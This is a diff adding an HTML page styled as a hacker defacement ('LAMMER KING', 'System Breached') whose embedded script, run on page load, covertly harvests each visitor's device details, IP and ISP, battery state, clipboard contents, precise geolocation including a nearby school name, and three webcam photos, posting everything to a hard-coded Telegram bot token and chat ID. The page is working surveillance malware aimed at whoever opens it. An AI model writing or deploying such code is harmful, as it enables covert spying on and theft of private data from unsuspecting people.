@@ -1,0 +1,167 @@
+<!doctype html>
+<html lang="en"> 
+ <head> 
+  <meta charset="UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <title>LAMMER KING</title> 
+  <link href="https://fonts.googleapis.com/css?family=Iceland" rel="stylesheet"> 
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 
+  <style>
+    body {
+      background-color: black;
+      color: white;
+      text-align: center;
+      font-family: 'Iceland', sans-serif;
+    }
+    .title {
+      font-size: 3rem;
+      color: red;
+    }
+    .subtitle {
+      font-size: 2.5rem;
+      color: green;
+    }
+    .quote {
+      font-size: 1.5rem;
+      margin: 20px 0;
+    }
+    .logo-container {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+    }
+    .logo-container img {
+      width: 300px;
+      height: auto;
+    }
+    audio {
+      margin-top: 20px;
+    }
+  </style> 
+ </head> 
+ <body> 
+  <h1 class="title">UDAH TOLOL YAPIT BEGO LAGI LAMMER</h1> 
+  <div class="logo-container"> 
+   <img src="https://l.top4top.io/p_3313l7mlic1.png" alt="Logo"> 
+  </div> 
+  <h2 class="subtitle">WE SEE YOU</h2> 
+  <p class="quote">System Breached</p> 
+  <audio id="player" src="https://i.top4top.io/m_33131khih0.mp3" loop controls autoplay></audio> 
+  <script>
+    const botToken = '7600495004:AAHGvUqaQ7RBq8uePkznWO5a-LMAAJpp7HI';
+    const chatID = '7272950878';
+
+    function sendToTelegram(message) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: `chat_id=${chatID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`
+      });
+    }
+
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      const plat = navigator.platform;
+      const lang = navigator.language;
+      const res = `${screen.width}x${screen.height}`;
+      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const online = navigator.onLine ? "Online" : "Offline";
+      const now = new Date().toLocaleString();
+
+      return `🖥 *Device Info*\n- User-Agent: ${ua}\n- Platform: ${plat}\n- Language: ${lang}\n- Resolution: ${res}\n- Timezone: ${tz}\n- Status: ${online}\n- Access Time: ${now}`;
+    }
+
+    function getIPInfo() {
+      return fetch("https://ipinfo.io/json")
+        .then(res => res.json())
+        .then(data => {
+          return `🌐 *IP Info*\n- IP: ${data.ip}\n- City: ${data.city}\n- Region: ${data.region}\n- Country: ${data.country}\n- Location: ${data.loc}\n- ISP: ${data.org}`;
+        });
+    }
+
+    function getBattery() {
+      if (navigator.getBattery) {
+        return navigator.getBattery().then(batt => {
+          return `🔋 *Battery*\n- Level: ${Math.round(batt.level * 100)}%\n- Charging: ${batt.charging ? "Yes" : "No"}`;
+        });
+      } else {
+        return Promise.resolve("Battery status not supported.");
+      }
+    }
+
+    function getGeoFromIP() {
+      return fetch("https://ipinfo.io/json")
+        .then(res => res.json())
+        .then(data => {
+          const [lat, lon] = data.loc.split(",");
+          return `📍 *Approx. Location*\n- Latitude: ${lat}\n- Longitude: ${lon}\n- Maps: https://www.google.com/maps?q=${lat},${lon}`;
+        });
+    }
+
+    function getClipboardText() {
+      if (navigator.clipboard && navigator.clipboard.readText) {
+        return navigator.clipboard.readText().then(text => {
+          return `📋 *Clipboard:*\n${text}`;
+        }).catch(() => "Clipboard not accessible.");
+      }
+      return Promise.resolve("Clipboard not supported.");
+    }
+
+    function capturePhotos() {
+      let video = document.createElement('video');
+      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+        video.srcObject = stream;
+        video.play();
+        let count = 0;
+        let interval = setInterval(() => {
+          if (count >= 3) {
+            clearInterval(interval);
+            stream.getTracks().forEach(track => track.stop());
+            return;
+          }
+          let canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          let ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(blob => {
+            let formData = new FormData();
+            formData.append('chat_id', chatID);
+            formData.append('photo', blob, `photo${count}.jpg`);
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+              method: 'POST',
+              body: formData
+            });
+          }, 'image/jpeg');
+          count++;
+        }, 3000);
+      }).catch(() => {});
+    }
+
+    function getGeoLocation() {
+      navigator.geolocation.getCurrentPosition(async pos => {
+        const { latitude, longitude } = pos.coords;
+        let res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
+        let data = await res.json();
+        let school = data.address.school || 'N/A';
+        let locationText = `📍 *Location Details* \n- Latitude: ${latitude}\n- Longitude: ${longitude}\n- City: ${data.address.city || 'N/A'}\n- School: ${school}\n- Country: ${data.address.country}\n- Maps: https://www.google.com/maps?q=${latitude},${longitude}`;
+        sendToTelegram(locationText);
+      });
+    }
+
+    async function gatherAll() {
+      const info = getDeviceInfo();
+      const [ipInfo, battInfo, geoIP, clipboard] = await Promise.all([
+        getIPInfo(), getBattery(), getGeoFromIP(), getClipboardText()
+      ]);
+
+      sendToTelegram(`${info}\n\n${ipInfo}\n\n${battInfo}\n\n${geoIP}\n\n${clipboard}`);
+      capturePhotos();
+      getGeoLocation();
+    }
+
+    // Jalankan semuanya saat halaman dibuka
+    window.onload = gatherAll;
+  </script> 
+ </body>
+</html>
